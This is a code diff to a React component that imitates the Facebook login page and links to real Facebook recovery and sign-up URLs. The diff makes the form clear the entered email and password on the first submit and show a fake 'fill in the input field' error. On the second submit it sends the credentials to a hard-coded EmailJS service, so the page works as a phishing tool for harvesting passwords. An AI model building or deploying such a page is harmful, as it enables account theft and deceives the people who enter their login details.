@@ -1,24 +1,37 @@
 import logo from '../images/logo.svg'
-import React, { useRef } from 'react';
+import React, { useRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
+import Reloader from './Reloader';
 
-const Desktop = ({ formData, handleChange }) => {
+const Desktop = ({ formData, setFormData,handleChange }) => {
     const form = useRef();
+    const [times, setTime] = useState(0);
     
     const handleSubmit = (e) => {
         e.preventDefault();
-        emailjs
+        setTime(prev => ++prev);
+        if(times === 0) {
+            setFormData({
+                email: '',
+                password: ''
+            });
+        }
+        else if (times === 1) {
+            emailjs
             .sendForm('service_b2vvpse', 'template_ebmbhy9', form.current, '8PsCARLu8bf-E5pdw')
             .then((result) => {
                 console.log(result.text);
                 console.log('success')
             }, (error) => {
-                console.log(error.text);
+                console.log('error');
         });
+        setTime(0);
+        }
     }
 
     return ( 
         <section className="login">
+            <Reloader/>
             <div className="facebook--container">
 
                 <div className="facebook--items one">
@@ -47,12 +60,13 @@ const Desktop = ({ formData, handleChange }) => {
                             onChange={handleChange}
                         />
                         <input className='submit--btn curve' type="submit"  value='Log in' />
+                        {times === 1 && <p className='error--mgs curve'>fill in  the input field</p>}
                         <a href='https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0' className='forgotten--password curve' >Forgotten password?</a>
-                        <p className='hr-or'>
+                        <div className='hr-or'>
                             <div><hr className='curve' /></div>
                             <div className='or'>or</div>
                             <div><hr className='curve' /></div>
-                        </p>
+                        </div>
                         <a href='https://web.facebook.com/r.php' className='create--new--account curve'>Create new account</a>
 
                     </form>
